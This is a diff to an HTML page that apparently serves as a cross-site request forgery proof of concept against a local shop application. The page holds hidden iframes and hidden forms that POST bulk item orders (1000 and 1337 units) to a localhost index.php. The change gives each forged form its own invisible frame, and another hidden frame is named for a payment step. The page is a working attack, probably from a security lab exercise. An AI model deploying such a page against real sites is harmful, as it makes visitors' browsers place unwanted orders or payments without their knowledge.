@@ -3,13 +3,14 @@
 	<h1>HELLO THERE</h1>
 </head>
 <body>
-	<iframe style="display:none" name="csrfItem"></iframe>
+	<iframe style="display:none" name="csrfItem1"></iframe>
+	<iframe style="display:none" name="csrfItem2"></iframe>
 	<iframe style="display:none" name="csrfPay"></iframe>
-		<form id="item1-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem">
+		<form id="item1-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem1">
 			<input type=hidden name=nbrOfItems value=1000>
 			<input type=hidden name=itemid value=2>
 		</form>
-		<form id="item2-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem">
+		<form id="item2-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem2">
 			<input type=hidden name=nbrOfItems value=1337>
 			<input type=hidden name=itemid value=1>
 		</form>
